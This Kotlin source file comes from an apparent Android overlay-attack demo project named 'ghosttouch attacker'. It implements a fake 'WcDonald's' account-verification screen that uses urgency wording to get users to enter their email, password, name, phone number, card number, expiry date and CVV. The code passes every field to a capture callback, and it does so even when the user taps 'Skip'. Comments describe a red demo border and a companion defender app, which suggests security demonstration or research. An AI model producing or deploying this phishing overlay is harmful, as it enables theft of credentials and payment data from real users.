package com.ghosttouch.attacker.overlay

import android.util.Log
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.foundation.verticalScroll
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * Complete data-capture overlay mimicking a WcDonald's "Account Verification" flow.
 *
 * Uses the same Material3 Scaffold/TopAppBar as the real defender app for visual
 * consistency. Captures all fields: email, password, name, phone, card, expiry, CVV.
 *
 * Red border added for demo visibility.
 */

private val WcRed = Color(0xFFDA291C)
private val WcYellow = Color(0xFFFFC72C)
private val WcWhite = Color(0xFFFFFFFF)
private val WcBackground = Color(0xFFFAFAFA)
private val WcGrayDark = Color(0xFF757575)
private val WcGray = Color(0xFFF5F5F5)
private val WcWarning = Color(0xFFF57C00)
private val DemoBorderRed = Color(0xFFFF0000)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun CaptureAllOverlay(
    onDataCaptured: (fields: Map<String, String>) -> Unit,
    onDismiss: () -> Unit
) {
    var email by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    var fullName by remember { mutableStateOf("") }
    var phone by remember { mutableStateOf("") }
    var cardNumber by remember { mutableStateOf("") }
    var expiry by remember { mutableStateOf("") }
    var cvv by remember { mutableStateOf("") }
    var passwordVisible by remember { mutableStateOf(false) }
    var isSubmitting by remember { mutableStateOf(false) }
    val coroutineScope = rememberCoroutineScope()

    /** Snapshot all fields into a map and fire callback. */
    fun captureAll() {
        val captured = mutableMapOf<String, String>()
        val e = email; val p = password; val n = fullName
        val ph = phone; val c = cardNumber; val ex = expiry; val cv = cvv

        if (e.isNotBlank()) captured["email"] = e
        if (p.isNotBlank()) captured["password"] = p
        if (n.isNotBlank()) captured["name"] = n
        if (ph.isNotBlank()) captured["phone"] = ph
        if (c.isNotBlank()) captured["card"] = c
        if (ex.isNotBlank()) captured["expiry"] = ex
        if (cv.isNotBlank()) captured["cvv"] = cv

        Log.d("CaptureAllOverlay", "Captured ${captured.size} fields: ${captured.keys}")
        onDataCaptured(captured)
    }

    Box(
        modifier = Modifier
            .fillMaxSize()
            .border(3.dp, DemoBorderRed)
            .background(WcBackground)
    ) {
        Scaffold(
            containerColor = WcBackground,
            topBar = {
                TopAppBar(
                    title = { Text("Account Verification") },
                    navigationIcon = {
                        IconButton(onClick = { /* fake back */ }) {
                            Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
                        }
                    },
                    colors = TopAppBarDefaults.topAppBarColors(
                        containerColor = WcRed,
                        titleContentColor = WcWhite,
                        navigationIconContentColor = WcWhite
                    )
                )
            }
        ) { padding ->
            Column(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(padding)
                    .verticalScroll(rememberScrollState())
            ) {
                // Warning banner — urgency social engineering
                Box(
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(WcWarning.copy(alpha = 0.12f))
                        .padding(horizontal = 16.dp, vertical = 12.dp)
                ) {
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Icon(
                            Icons.Default.Warning,
                            contentDescription = null,
                            tint = WcWarning,
                            modifier = Modifier.size(20.dp)
                        )
                        Spacer(modifier = Modifier.width(8.dp))
                        Column {
                            Text(
                                "Verification Required",
                                fontWeight = FontWeight.Bold,
                                fontSize = 14.sp,
                                color = WcWarning
                            )
                            Text(
                                "Please verify your account to continue using WcDonald's",
                                fontSize = 12.sp,
                                color = WcGrayDark
                            )
                        }
                    }
                }

                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(24.dp),
                    horizontalAlignment = Alignment.CenterHorizontally,
                    verticalArrangement = Arrangement.spacedBy(12.dp)
                ) {
                    // Logo — same as defender
                    Box(
                        modifier = Modifier
                            .size(60.dp)
                            .background(WcYellow, RoundedCornerShape(30.dp)),
                        contentAlignment = Alignment.Center
                    ) {
                        Text("W", fontSize = 32.sp, fontWeight = FontWeight.Bold, color = WcRed)
                    }

                    Spacer(modifier = Modifier.height(4.dp))

                    // ── Section 1: Sign-in ──
                    Text(
                        "Sign-in Details",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold,
                        modifier = Modifier.fillMaxWidth()
                    )

                    OutlinedTextField(
                        value = email,
                        onValueChange = { email = it },
                        label = { Text("Email") },
                        placeholder = { Text("your@email.com") },
                        leadingIcon = { Icon(Icons.Default.Email, contentDescription = null) },
                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Email),
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(12.dp)
                    )

                    OutlinedTextField(
                        value = password,
                        onValueChange = { password = it },
                        label = { Text("Password") },
                        leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                        trailingIcon = {
                            IconButton(onClick = { passwordVisible = !passwordVisible }) {
                                Icon(
                                    if (passwordVisible) Icons.Default.Visibility
                                    else Icons.Default.VisibilityOff,
                                    contentDescription = null
                                )
                            }
                        },
                        visualTransformation = if (passwordVisible) VisualTransformation.None
                        else PasswordVisualTransformation(),
                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(12.dp)
                    )

                    Spacer(modifier = Modifier.height(8.dp))

                    // ── Section 2: Personal Info ──
                    Text(
                        "Personal Information",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold,
                        modifier = Modifier.fillMaxWidth()
                    )

                    OutlinedTextField(
                        value = fullName,
                        onValueChange = { fullName = it },
                        label = { Text("Full Name") },
                        leadingIcon = { Icon(Icons.Default.Person, contentDescription = null) },
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(12.dp)
                    )

                    OutlinedTextField(
                        value = phone,
                        onValueChange = { phone = it.filter { c -> c.isDigit() || c == '+' } },
                        label = { Text("Phone Number") },
                        leadingIcon = { Icon(Icons.Default.Phone, contentDescription = null) },
                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Phone),
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(12.dp)
                    )

                    Spacer(modifier = Modifier.height(8.dp))

                    // ── Section 3: Payment ──
                    Text(
                        "Payment Method",
                        style = MaterialTheme.typography.titleMedium,
                        fontWeight = FontWeight.Bold,
                        modifier = Modifier.fillMaxWidth()
                    )

                    Text(
                        "Verify your saved payment to keep ordering",
                        style = MaterialTheme.typography.bodySmall,
                        color = WcGrayDark,
                        modifier = Modifier.fillMaxWidth()
                    )

                    OutlinedTextField(
                        value = cardNumber,
                        onValueChange = {
                            if (it.length <= 16) cardNumber = it.filter { c -> c.isDigit() }
                        },
                        label = { Text("Card Number") },
                        leadingIcon = { Icon(Icons.Default.CreditCard, contentDescription = null) },
                        keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(12.dp)
                    )

                    Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                        OutlinedTextField(
                            value = expiry,
                            onValueChange = { if (it.length <= 5) expiry = it },
                            label = { Text("MM/YY") },
                            leadingIcon = { Icon(Icons.Default.DateRange, contentDescription = null) },
                            singleLine = true,
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(12.dp)
                        )
                        OutlinedTextField(
                            value = cvv,
                            onValueChange = {
                                if (it.length <= 3) cvv = it.filter { c -> c.isDigit() }
                            },
                            label = { Text("CVV") },
                            leadingIcon = { Icon(Icons.Default.Lock, contentDescription = null) },
                            keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Number),
                            singleLine = true,
                            modifier = Modifier.weight(1f),
                            shape = RoundedCornerShape(12.dp)
                        )
                    }

                    Spacer(modifier = Modifier.height(16.dp))

                    // Submit — captures ALL fields at once
                    Button(
                        onClick = {
                            isSubmitting = true
                            captureAll()
                            coroutineScope.launch {
                                delay(800)
                                onDismiss()
                            }
                        },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(52.dp),
                        shape = RoundedCornerShape(12.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = WcRed),
                        enabled = !isSubmitting &&
                                (email.isNotBlank() || fullName.isNotBlank() || cardNumber.isNotBlank())
                    ) {
                        if (isSubmitting) {
                            CircularProgressIndicator(
                                modifier = Modifier.size(24.dp),
                                color = WcWhite
                            )
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("Verifying...", fontSize = 16.sp)
                        } else {
                            Text("Verify Account", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                        }
                    }

                    // Skip — still captures whatever was entered
                    TextButton(
                        onClick = {
                            captureAll()
                            coroutineScope.launch {
                                delay(300)
                                onDismiss()
                            }
                        },
                        enabled = !isSubmitting
                    ) {
                        Text("Skip for now", color = WcGrayDark, fontSize = 14.sp)
                    }

                    Spacer(modifier = Modifier.height(16.dp))
                }
            }
        }
    }
}
